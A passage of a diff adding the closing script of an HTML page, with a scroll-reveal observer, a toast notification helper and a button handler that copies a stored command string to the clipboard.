+    }, { threshold: 0.06 });
+    document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+    function showToast(msg) {
+        let toast = document.querySelector('.toast');
+        if (!toast) {
+            toast = document.createElement('div');
+            toast.className = 'toast';
+            document.body.appendChild(toast);
+        }
+        toast.textContent = msg;
+        toast.classList.add('show');
+        setTimeout(() => toast.classList.remove('show'), 2000);
+    }
+
+    function copyCmd(btn) {
+        const block = btn.closest('.cmd-block');
+        const cmd = block.dataset.cmd || '';
+        if (!cmd) return;
+        navigator.clipboard.writeText(cmd).then(() => {
+            btn.textContent = '✓';
+            btn.classList.add('copied');
+            showToast('Command copied ✓');
+            setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1800);
+        }).catch(() => showToast('Copy error'));
+    }
+</script>
+
+</body>
+</html>
